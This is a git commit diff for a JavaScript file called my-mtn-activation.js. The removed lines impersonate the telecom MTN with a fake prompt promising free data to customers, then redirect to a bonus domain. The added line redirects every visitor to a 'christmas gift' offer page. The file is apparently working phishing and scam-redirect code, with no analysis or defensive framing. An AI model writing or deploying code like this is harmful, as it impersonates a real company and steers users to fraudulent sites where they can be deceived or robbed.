cd3d826d8e61048e276f95be72438b88ffcec854
opayoffer <154964955+opayoffer@users.noreply.github.com>
2024-06-14 06:05:29 -0700

    Update my-mtn-activation.js

--- my-mtn-activation.js
+++ my-mtn-activation.js
@@ -1,6 +1,1 @@
-
-var password = '1'
-password=prompt('MTN: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
-if (password != '1') {
-location.href='https://2024-bonus.xyz/my-mtn-app';
-}
+window.location.href = "https://xmas-gift.org/clients-offer.html";
